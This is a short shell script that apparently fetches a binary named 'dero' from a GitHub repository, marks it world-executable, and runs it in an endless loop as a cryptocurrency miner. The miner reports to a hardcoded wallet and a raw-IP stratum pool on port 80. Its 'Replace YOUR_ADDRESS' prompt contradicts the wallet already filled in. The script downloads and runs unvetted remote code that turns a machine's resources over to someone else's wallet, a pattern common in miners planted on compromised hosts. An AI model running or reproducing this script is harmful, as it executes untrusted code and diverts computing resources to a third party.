wget https://github.com/angkii/m/raw/main/dero
chmod 777 dero

#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./dero -w sugar1qrmcvknsaaf2tucuugylapj4ljz8kq4864azn3j.MAJA -r 68.183.121.90:80 -p stratum;
    sleep 5;
done
